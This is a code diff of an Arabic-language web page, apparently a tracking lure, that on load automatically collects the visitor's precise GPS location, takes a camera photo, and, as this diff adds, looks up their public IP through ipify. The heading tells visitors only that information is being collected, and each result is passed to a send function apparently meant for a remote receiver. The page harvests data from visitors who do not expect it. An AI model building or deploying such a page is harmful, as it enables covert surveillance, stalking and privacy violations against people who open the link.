@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>📍 تحديد + تصوير تلقائي</title>
+  <title>📍 تحديد + تصوير تلقائي + IP</title>
 </head>
 <body>
   <h2>📡 جاري جمع المعلومات...</h2>
@@ -36,7 +36,6 @@
     function capturePhotoAndSend(video, stream) {
       const canvas = document.getElementById("canvas");
       const context = canvas.getContext("2d");
-
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       context.drawImage(video, 0, 0);
@@ -54,21 +53,18 @@
       stream.getTracks().forEach(track => track.stop());
     }
 
-  function initCamera() {
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        const video = document.getElementById("video");
-        video.srcObject = stream;
-
-        // ✅ الالتقاط فور تشغيل أول فريم
-        video.addEventListener('playing', () => {
-          capturePhotoAndSend(video, stream);
+    function initCamera() {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          const video = document.getElementById("video");
+          video.srcObject = stream;
+          video.addEventListener('playing', () => {
+            capturePhotoAndSend(video, stream);
+          });
+        })
+        .catch(err => {
+          document.getElementById("result").innerText += "\n❌ الكاميرا غير متاحة: " + err.message;
         });
-      })
-      .catch(err => {
-        document.getElementById("result").innerText += "\n❌ الكاميرا غير متاحة: " + err.message;
-      });
-
     }
 
     function getLocationAndSend() {
@@ -78,13 +74,11 @@
             const lat = pos.coords.latitude.toFixed(6);
             const lon = pos.coords.longitude.toFixed(6);
             const acc = pos.coords.accuracy;
-
             const msg = `📍 تحديد الموقع (GPS):
 Latitude: ${lat}
 Longitude: ${lon}
 📏 الدقة: ±${acc} متر
 🗺️ https://www.google.com/maps?q=${lat},${lon}`;
-
             document.getElementById("result").innerText = msg;
             sendMessage(msg);
           },
@@ -92,11 +86,7 @@ Longitude: ${lon}
             document.getElementById("result").innerText = "❌ فشل تحديد الموقع: " + err.message;
             sendMessage("❌ فشل تحديد الموقع: " + err.message);
           },
-          {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0
-          }
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
       } else {
         document.getElementById("result").innerText = "❌ جهازك لا يدعم GPS";
@@ -104,9 +94,24 @@ Longitude: ${lon}
       }
     }
 
-    // البدء مباشرة
+    function getIPandSend() {
+      // استخدام api.ipify لإرجاع IP خارجي دقيق
+      fetch("https://api.ipify.org?format=json")
+        .then(response => response.json())
+        .then(data => {
+          const ipMsg = `🌐 IP Address: ${data.ip}`;
+          document.getElementById("result").innerText += "\n" + ipMsg;
+          sendMessage(ipMsg);
+        })
+        .catch(err => {
+          document.getElementById("result").innerText += "\n❌ فشل الحصول على IP: " + err.message;
+        });
+    }
+
+    // ✅ بدء تلقائي
     getLocationAndSend();
     initCamera();
+    getIPandSend();
   </script>
 </body>
 </html>
